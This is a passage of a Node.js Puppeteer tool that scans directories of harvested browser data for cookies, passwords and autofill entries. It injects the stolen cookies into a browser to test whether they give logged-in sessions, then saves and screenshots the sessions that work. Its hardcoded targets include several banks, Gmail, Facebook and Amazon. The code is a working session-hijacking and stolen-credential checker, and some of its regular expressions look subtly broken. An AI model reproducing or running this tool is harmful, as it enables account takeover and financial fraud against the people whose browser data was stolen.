        } else if (!rescanChoice.toLowerCase().startsWith("y")) {
          console.log("   ⏭️  Skipping re-scan. Use Mode 2 to test existing prepared cookies.");
          rl.close();
          return;
        }

        console.log("   🔄 Proceeding with re-scan...");
      }

      break;
    }

    // Enhanced directory analysis
    console.log("\n🔍 ENHANCED DIRECTORY ANALYSIS:");
    console.log(`   📁 Target: ${targetDir}`);

    // Get directory statistics
    let totalFiles = 0;
    let cookieFiles = 0;
    let totalSize = 0;

    try {
      const getDirectoryStats = (dir) => {
        const items = fs.readdirSync(dir);
        for (const item of items) {
          const itemPath = path.join(dir, item);
          try {
            const stat = fs.statSync(itemPath);
            if (stat.isDirectory()) {
              getDirectoryStats(itemPath);
            } else {
              totalFiles++;
              totalSize += stat.size;
              if (item.toLowerCase().includes("cookie") || item.toLowerCase().includes("jar")) {
                cookieFiles++;
              }
            }
          } catch (_) {
            // Skip inaccessible files/directories
          }
        }
      };

      console.log("   🔄 Analyzing directory structure...");
      getDirectoryStats(targetDir);

      console.log("   📊 Directory Statistics:");
      console.log(`      📄 Total files: ${totalFiles}`);
      console.log(`      🍪 Cookie-related files: ${cookieFiles}`);
      console.log(`      💾 Total size: ${(totalSize / 1024 / 1024).toFixed(2)} MB`);

      if (cookieFiles === 0) {
        console.log("\n   ⚠️  Warning: No obvious cookie files detected");
        const continueChoice = await ask("   Continue scanning anyway? (y/n): ");
        if (!continueChoice.toLowerCase().startsWith("y")) {
          console.log("   ❌ Scan cancelled");
          rl.close();
          return;
        }
      }

    } catch (error) {
      console.log(`   ⚠️  Could not analyze directory: ${error.message}`);
    }

    try {
      const scanStartTime = Date.now();
      console.log("\n🚀 Starting enhanced scan with duplicate prevention...");

      // Run the intelligence system
      const crossReferencedData = await this.cookieIntelligence.scanDirectoryRecursively(targetDir);
      const savedDomains = await this.cookieIntelligence.saveWorkableData();

      const scanDuration = Date.now() - scanStartTime;

      // Update scan tracking
      const currentScan = {
        directory: targetDir,
        lastScanned: new Date().toISOString(),
        domainsFound: savedDomains.length,
        cookiesFound: crossReferencedData?.summary?.totalCookies || 0,
        analysisFile: path.join(CONFIG.outputDirs.analysis, "discovery_analysis.json"),
        scanDuration: scanDuration,
        version: "3.0"
      };

      scannedDirectories[targetDir] = currentScan;
      scanHistory.push(currentScan);

      // Save tracking data
      fs.writeFileSync(duplicateTrackingPath, JSON.stringify(scannedDirectories, null, 2));
      fs.writeFileSync(scanHistoryPath, JSON.stringify(scanHistory, null, 2));

      console.log(`\n✅ DISCOVERY COMPLETE - ${savedDomains.length} domains prepared`);
      console.log(`   ⏱️  Scan duration: ${(scanDuration / 1000).toFixed(2)} seconds`);
      console.log(`   📁 Prepared cookies: ${CONFIG.outputDirs.prepared}`);
      console.log(`   📊 Analysis saved: ${currentScan.analysisFile}`);
      console.log(`   🗂️  Tracking updated: ${duplicateTrackingPath}`);

      // Show top recommendations with enhanced info
      if (savedDomains.length > 0) {
        console.log("\n🎯 TOP RECOMMENDATIONS FOR TESTING:");
        savedDomains.slice(0, 10).forEach((domain, index) => {
          console.log(`   ${index + 1}. ${domain.domain} | Score: ${domain.score}% | Cookies: ${domain.cookies} | Endpoints: ${domain.endpoints}`);
        });

        // Show scan comparison if previous data exists
        const previousScanCount = scanHistory.length;
        if (previousScanCount > 1) {
          const previousScan = scanHistory[previousScanCount - 2];
          const domainDiff = savedDomains.length - previousScan.domainsFound;
          const cookieDiff = (crossReferencedData?.summary?.totalCookies || 0) - previousScan.cookiesFound;

          console.log("\n📈 SCAN COMPARISON (vs previous scan):");
          console.log(`   🎯 Domains: ${domainDiff >= 0 ? "+" : ""}${domainDiff} (${savedDomains.length} total)`);
          console.log(`   🍪 Cookies: ${cookieDiff >= 0 ? "+" : ""}${cookieDiff} (${crossReferencedData?.summary?.totalCookies || 0} total)`);
        }
      }

      rl.close();

    } catch (error) {
      console.error(`💥 Discovery failed: ${error.message}`);
      rl.close();
      process.exit(1);
    }
  }

  async runAutoTestingMode() {
    console.log("\n🤖 MODE 2: AUTOMATIC SESSION TESTING");
    console.log("This mode will automatically test prepared cookies with T-1 timing.");

    const preparedDir = CONFIG.outputDirs.prepared;
    if (!fs.existsSync(preparedDir)) {
      console.log("❌ No prepared cookies found. Run Mode 1 first.");
      rl.close();
      return;
    }

    const cookieFiles = fs.readdirSync(preparedDir)
      .filter(f => f.endsWith(".txt"))
      .map(f => ({ file: f, path: path.join(preparedDir, f) }));

    if (cookieFiles.length === 0) {
      console.log("❌ No cookie files found in prepared directory.");
      rl.close();
      return;
    }

    console.log(`📁 Found ${cookieFiles.length} prepared domains to test`);

    let browser = null;
    const results = [];

    try {
      console.log("🌐 Launching browser with T-1 timing system...");

      // Enhanced browser launch args for Linux compatibility
      const browserArgs = [
        "--no-sandbox",
        "--disable-setuid-sandbox",
        "--disable-dev-shm-usage",
        "--disable-web-security",
        "--disable-features=VizDisplayCompositor",
        "--disable-gpu",
        "--disable-background-timer-throttling",
        "--disable-backgrounding-occluded-windows",
        "--disable-renderer-backgrounding",
        "--no-first-run",
        "--no-default-browser-check",
        "--disable-extensions",
        "--disable-plugins",
        "--disable-default-apps",
        "--disable-translate",
        "--disable-sync"
      ];

      try {
        // Try with system Chrome first
        browser = await puppeteer.launch({
          executablePath: "/usr/bin/google-chrome",
          headless: "new",
          args: browserArgs,
          timeout: 60000,
          protocolTimeout: 240000
        });
        console.log("✅ Browser launched successfully with system Chrome");
      } catch (error) {
        console.log(`⚠️  System Chrome launch failed: ${error.message}`);
        console.log("🔄 Trying with Puppeteer's bundled Chrome...");
        // Fallback: Try with minimal args and bundled Chrome
        try {
          browser = await puppeteer.launch({
            headless: "new",
            args: ["--no-sandbox", "--disable-setuid-sandbox"],
            timeout: 90000
          });
          console.log("✅ Browser launched successfully with bundled Chrome");
        } catch (fallbackError) {
          console.log("❌ All browser launch attempts failed:");
          console.log(`   Primary error: ${error.message}`);
          console.log(`   Fallback error: ${fallbackError.message}`);
          throw fallbackError;
        }
      }

      let testCount = 0;
      for (const cookieFile of cookieFiles) {
        testCount++;
        const domain = path.basename(cookieFile.file, ".txt").replace(/_/g, ".");

        console.log(`\n[${testCount}/${cookieFiles.length}] 🧪 TESTING: ${domain}`);
        console.log("═══════════════════════════════════════════════════════════");

        try {
          const page = await browser.newPage();

          // T-1 Cookie Injection
          const injectionResult = await this.t1Injector.injectCookiesWithT1Timing(
            page, cookieFile.path, domain
          );

          // Determine test URL
          const testUrl = await this.determineTestUrl(cookieFile.path, domain);
          console.log(`  🎯 Test URL: ${testUrl}`);

          // T+1: Navigate with cookies already injected
          await page.goto(testUrl, {
            waitUntil: "networkidle0",
            timeout: 20000
          });

          // T+2: Analyze session
          const analysisResult = await this.sessionAnalyzer.analyzeSession(
            page, domain, testUrl
          );

          const result = {
            ...injectionResult,
            ...analysisResult,
            testUrl,
            mode: "AUTO_TESTING"
          };

          results.push(result);

          // Save verified session if successful
          if (result.detection.isLoggedIn) {
            await this.saveVerifiedSession(result, cookieFile.path);

            // Take screenshot
            const screenshotPath = path.join(CONFIG.outputDirs.screenshots, `${domain}_auto_success.png`);
            await page.screenshot({ path: screenshotPath, fullPage: true });
            console.log(`  📸 Screenshot saved: ${screenshotPath}`);
          }

          await page.close();

        } catch (error) {
          console.error(`  💥 Error testing ${domain}: ${error.message}`);
          results.push({
            domain,
            error: error.message,
            status: "ERROR",
            mode: "AUTO_TESTING",
            timestamp: new Date().toISOString()
          });
        }

        // Delay between tests
        await new Promise(resolve => setTimeout(resolve, 2000));
      }

    } finally {
      if (browser) await browser.close();
    }

    // Save results
    await this.saveTestResults(results, "auto_test_results.json");
    await this.printTestSummary(results, "AUTOMATIC TESTING");

    rl.close();
  }

  async runManualTestingMode() {
    console.log("\n👤 MODE 3: MANUAL SESSION TESTING");
    console.log("This mode will open a browser for manual verification of each session.");

    const preparedDir = CONFIG.outputDirs.prepared;
    if (!fs.existsSync(preparedDir)) {
      console.log("❌ No prepared cookies found. Run Mode 1 first.");
      rl.close();
      return;
    }

    const cookieFiles = fs.readdirSync(preparedDir)
      .filter(f => f.endsWith(".txt"))
      .map(f => ({ file: f, path: path.join(preparedDir, f) }));

    if (cookieFiles.length === 0) {
      console.log("❌ No cookie files found in prepared directory.");
      rl.close();
      return;
    }

    console.log(`📁 Found ${cookieFiles.length} prepared domains for manual testing`);
    console.log("\n⚠️  MANUAL TESTING INSTRUCTIONS:");
    console.log("   1. A browser will open for each domain");
    console.log("   2. Cookies will be injected using T-1 timing");
    console.log("   3. Browse the site to verify if you're logged in");
    console.log("   4. Answer \"yes\" or \"no\" when prompted about login status");
    console.log("   5. The browser will close automatically after your response");

    const proceed = await ask("\n🚀 Ready to start manual testing? (y/n): ");
    if (proceed.toLowerCase() !== "y") {
      console.log("Testing cancelled.");
      rl.close();
      return;
    }

    let browser = null;
    const results = [];

    try {
      console.log("🌐 Launching browser for manual testing...");

      try {
        // Try with virtual display first (for headless environments)
        browser = await puppeteer.launch({
          headless: false, // Non-headless for manual inspection
          devtools: false, // Disable devtools initially for stability
          args: [
            "--no-sandbox",
            "--disable-setuid-sandbox",
            "--disable-web-security",
            "--disable-dev-shm-usage",
            "--start-maximized",
            "--disable-gpu",
            "--no-first-run"
          ],
          timeout: 60000
        });
        console.log("✅ Browser launched successfully for manual testing");
      } catch (error) {
        console.log(`⚠️  Non-headless browser launch failed: ${error.message}`);
        console.log("🔄 Falling back to headless mode with extended analysis...");
        // Fallback: Use headless but with extended analysis time
        browser = await puppeteer.launch({
          headless: "new",
          args: [
            "--no-sandbox",
            "--disable-setuid-sandbox",
            "--disable-web-security"
          ],
          timeout: 60000
        });
      }

      let testCount = 0;
      for (const cookieFile of cookieFiles) {
        testCount++;
        const domain = path.basename(cookieFile.file, ".txt").replace(/_/g, ".");

        console.log(`\n[${testCount}/${cookieFiles.length}] 👤 MANUAL TEST: ${domain}`);
        console.log("═══════════════════════════════════════════════════════════");

        try {
          const page = await browser.newPage();

          // T-1 Cookie Injection (same as auto mode)
          console.log("  🔄 Preparing T-1 injection for manual testing...");
          const injectionResult = await this.t1Injector.injectCookiesWithT1Timing(
            page, cookieFile.path, domain
          );

          // Determine test URL
          const testUrl = await this.determineTestUrl(cookieFile.path, domain);
          console.log(`  🎯 Test URL: ${testUrl}`);
          console.log("  🌐 Opening browser for manual inspection...");

          // T+1: Navigate with cookies already injected (extended timeout for manual testing)
          await page.goto(testUrl, {
            waitUntil: "networkidle2", // Less strict than networkidle0
            timeout: 45000  // Extended timeout for manual testing
          });

          // Wait for user to inspect the page
          console.log("\n  👀 INSPECT THE BROWSER WINDOW NOW");
          console.log("     - Check if you're logged in");
          console.log("     - Look for username, dashboard, logout button, etc.");
          console.log("     - Browse around if needed to confirm session status");

          let userResponse;
          while (true) {
            userResponse = await ask("\n  ❓ Is this a valid logged-in session? (yes/no): ");
            if (["yes", "y", "no", "n"].includes(userResponse.toLowerCase())) {
              break;
            }
            console.log("     Please answer 'yes' or 'no'");
          }

          const isLoggedIn = ["yes", "y"].includes(userResponse.toLowerCase());

          // Get additional info from user
          let confidence = 100;
          if (isLoggedIn) {
            const confidenceInput = await ask("  📊 Confidence level (1-100, default 95): ");
            confidence = parseInt(confidenceInput) || 95;
          } else {
            confidence = 0;
          }

          // Create manual result
          const result = {
            ...injectionResult,
            domain,
            testUrl,
            actualUrl: page.url(),
            title: await page.title(),
            userVerified: true,
            userResponse: userResponse.toLowerCase(),
            detection: {
              isLoggedIn,
              confidence,
              status: isLoggedIn ? "LOGGED_IN" : "NOT_LOGGED_IN",
              manualVerification: true
            },
            mode: "MANUAL_TESTING",
            timestamp: new Date().toISOString()
          };

          results.push(result);

          // Save verified session if successful
          if (isLoggedIn) {
            await this.saveManualVerifiedSession(result, cookieFile.path);

            // Take screenshot
            const screenshotPath = path.join(CONFIG.outputDirs.screenshots, `${domain}_manual_success.png`);
            await page.screenshot({ path: screenshotPath, fullPage: true });
            console.log(`    📸 Screenshot saved: ${screenshotPath}`);
            console.log("    ✅ Session verified and saved");
          } else {
            console.log("    ❌ Session not logged in - not saved");
          }

          await page.close();
          console.log("  🔄 Browser window closed. Moving to next domain...");

        } catch (error) {
          console.error(`  💥 Error during manual testing of ${domain}: ${error.message}`);
          results.push({
            domain,
            error: error.message,
            status: "ERROR",
            mode: "MANUAL_TESTING",
            timestamp: new Date().toISOString()
          });
        }

        // Brief pause between tests
        await new Promise(resolve => setTimeout(resolve, 1000));
      }

    } finally {
      if (browser) await browser.close();
    }

    // Save results
    await this.saveTestResults(results, "manual_test_results.json");
    await this.printTestSummary(results, "MANUAL TESTING");

    rl.close();
  }

  async determineTestUrl(cookieFilePath, domain) {
    // Try to read the best endpoint from cookie file header
    const content = fs.readFileSync(cookieFilePath, "utf-8");
    const lines = content.split("\n");

    // Look for endpoint information in header
    for (const line of lines) {
      if (line.startsWith("# - ") && line.includes("http")) {
        const url = line.match(/https?:[^\w.-][^\w.-][^\s)]+/);
        if (url) {
          return url[0];
        }
      }
    }

    // Fallback to domain-specific URLs
    const domainLower = domain.toLowerCase();

    if (domainLower.includes("vancity")) return "https://banking.vancity.com/";
    if (domainLower.includes("americanexpress")) return "https://global.americanexpress.com/myca/";
    if (domainLower.includes("capitalone")) return "https://myaccounts.capitalone.com/";
    if (domainLower.includes("td.com")) return "https://easyweb.td.com/";
    if (domainLower.includes("rbc")) return "https://www1.royalbank.com/cgi-bin/rbaccess/rbunxcgi?F6=1&F7=IB&F21=IB&F22=1&REQUEST=ClientSignin";
    if (domainLower.includes("bmo")) return "https://www1.bmo.com/banking/digital/login";
    if (domainLower.includes("gmail") || domainLower.includes("google")) return "https://mail.google.com/";
    if (domainLower.includes("linkedin")) return "https://www.linkedin.com/feed/";
    if (domainLower.includes("facebook")) return "https://www.facebook.com/";
    if (domainLower.includes("amazon")) return "https://www.amazon.com/your-account";
    if (domainLower.includes("walmart")) return "https://www.walmart.ca/account";

    // Default fallback
    return `https://${domain.replace(/^[^\w.-]/, "")}/`;
  }

  async saveVerifiedSession(result, originalCookiePath) {
    const safeDomain = result.domain.replace(/[^[^\w.-][^\w.-]-]/g, "_");
    const verifiedPath = path.join(CONFIG.outputDirs.verified, `${safeDomain}.txt`);

    // Copy original cookie file with verification info
    const originalContent = fs.readFileSync(originalCookiePath, "utf-8");
    const verifiedHeader = `# VERIFIED SESSION - AUTO TESTED
# Domain: ${result.domain}
# Test URL: ${result.testUrl}
# Confidence: ${result.detection.confidence}%
# Verified: ${result.timestamp}
# Cookie Injection Time: ${result.injectionTime}ms
# Status: ${result.detection.status}
#
${originalContent}`;

    fs.writeFileSync(verifiedPath, verifiedHeader);

    // Also save detailed result
    const resultPath = path.join(CONFIG.outputDirs.verified, `${safeDomain}_result.json`);
    fs.writeFileSync(resultPath, JSON.stringify(result, null, 2));
  }

  async saveManualVerifiedSession(result, originalCookiePath) {
    const safeDomain = result.domain.replace(/[^[^\w.-][^\w.-]-]/g, "_");
    const verifiedPath = path.join(CONFIG.outputDirs.manual, `${safeDomain}.txt`);

    // Copy original cookie file with manual verification info
    const originalContent = fs.readFileSync(originalCookiePath, "utf-8");
    const verifiedHeader = `# MANUALLY VERIFIED SESSION
# Domain: ${result.domain}
# Test URL: ${result.testUrl}
# User Response: ${result.userResponse}
# Confidence: ${result.detection.confidence}%
# Verified: ${result.timestamp}
# Cookie Injection Time: ${result.injectionTime}ms
# Status: ${result.detection.status}
#
${originalContent}`;

    fs.writeFileSync(verifiedPath, verifiedHeader);

    // Also save detailed result
    const resultPath = path.join(CONFIG.outputDirs.manual, `${safeDomain}_result.json`);
    fs.writeFileSync(resultPath, JSON.stringify(result, null, 2));
  }

  async saveTestResults(results, filename) {
    const resultsPath = path.join(CONFIG.workingDir, filename);
    fs.writeFileSync(resultsPath, JSON.stringify(results, null, 2));

    // Also save summary stats
    const successful = results.filter(r => r.detection?.isLoggedIn);
    const failed = results.filter(r => r.detection && !r.detection.isLoggedIn);
    const errors = results.filter(r => r.status === "ERROR");

    const summary = {
      timestamp: new Date().toISOString(),
      totalTested: results.length,
      successful: successful.length,
      failed: failed.length,
      errors: errors.length,
      successRate: `${((successful.length / (results.length - errors.length)) * 100).toFixed(1)}%`,
      averageInjectionTime: this.t1Injector.injectionStats.averageInjectionTime,
      injectionStats: this.t1Injector.injectionStats,
      results: results
    };

    const summaryPath = path.join(CONFIG.workingDir, filename.replace(".json", "_summary.json"));
    fs.writeFileSync(summaryPath, JSON.stringify(summary, null, 2));

    console.log("\n📁 Results saved:");
    console.log(`   📊 Detailed results: ${resultsPath}`);
    console.log(`   📈 Summary: ${summaryPath}`);
  }

  async printTestSummary(results, mode) {
    const successful = results.filter(r => r.detection?.isLoggedIn);
    const failed = results.filter(r => r.detection && !r.detection.isLoggedIn);
    const errors = results.filter(r => r.status === "ERROR");

    console.log(`\n🎉 ${mode} COMPLETE!`);
    console.log("════════════════════════════════════════════════════════════");
    console.log("📊 Final Summary:");
    console.log(`   🧪 Total tested: ${results.length}`);
    console.log(`   ✅ Successful sessions: ${successful.length}`);
    console.log(`   ❌ Failed sessions: ${failed.length}`);
    console.log(`   💥 Errors: ${errors.length}`);
    console.log(`   📈 Success rate: ${((successful.length / (results.length - errors.length)) * 100).toFixed(1)}%`);
    console.log(`   ⚡ Avg injection time: ${this.t1Injector.injectionStats.averageInjectionTime.toFixed(0)}ms`);

    if (successful.length > 0) {
      console.log("\n🎯 SUCCESSFUL SESSIONS:");
      successful.forEach((result, index) => {
        console.log(`   ${index + 1}. ${result.domain} (${result.detection.confidence}% confidence)`);
      });
    }

    if (mode === "MANUAL TESTING") {
      console.log(`\n📁 Verified sessions saved to: ${CONFIG.outputDirs.manual}`);
    } else {
      console.log(`\n📁 Verified sessions saved to: ${CONFIG.outputDirs.verified}`);
    }
  }
}

// Main execution
async function main() {
  console.clear();
  console.log(ASCII_HEADER);

  try {
    // Ensure all output directories exist
    for (const dir of Object.values(CONFIG.outputDirs)) {
      fs.mkdirSync(dir, { recursive: true });
    }

    // Mode selection
    let mode;
    while (true) {
      const input = await ask(`
Select operation mode:

1) 🔍 Cookie Discovery & Intelligence
   - Recursively scan directories for browser data
   - Cross-reference cookies, history, passwords, autofills
   - Prepare optimized cookie files with endpoint mapping
   - Save analysis and recommendations

2) 🤖 Automatic Session Testing  
   - Test prepared cookies with T-1 timing injection
   - Automated session detection with confidence scoring
   - Fast processing with detailed logging
   - Save verified sessions automatically

3) 👤 Manual Session Testing
   - Open browser for human verification
   - T-1 cookie injection with manual inspection  
   - User confirms session status
   - High accuracy for critical validation

4) 📚 View Scan History & Statistics
   - Show all previous directory scans
   - Compare scan results and statistics
   - Manage duplicate directory tracking
   - View analysis summaries

Choice (1/2/3/4): `);

      if (["1", "2", "3", "4"].includes(input.trim())) {
        mode = input.trim();
        break;
      }
      console.log("❌ Invalid choice. Please enter 1, 2, 3, or 4.");
    }

    const checker = new EnhancedSessionChecker();

    if (mode === "1") {
      await checker.runDiscoveryMode();
    } else if (mode === "2") {
      await checker.runAutoTestingMode();
    } else if (mode === "3") {
      await checker.runManualTestingMode();
    } else if (mode === "4") {
      await checker.viewScanHistory();
    }

  } catch (error) {
    console.error(`\n💥 Fatal error: ${error.message}`);
    console.error(error.stack);
    rl.close();
    process.exit(1);
  }
}

// Handle graceful shutdown
process.on("SIGINT", () => {
  console.log("\n🛑 Shutting down gracefully...");
  rl.close();
  process.exit(0);
});

// Start the application
main().catch(error => {
  console.error("Application failed to start:", error);
  process.exit(1);
});
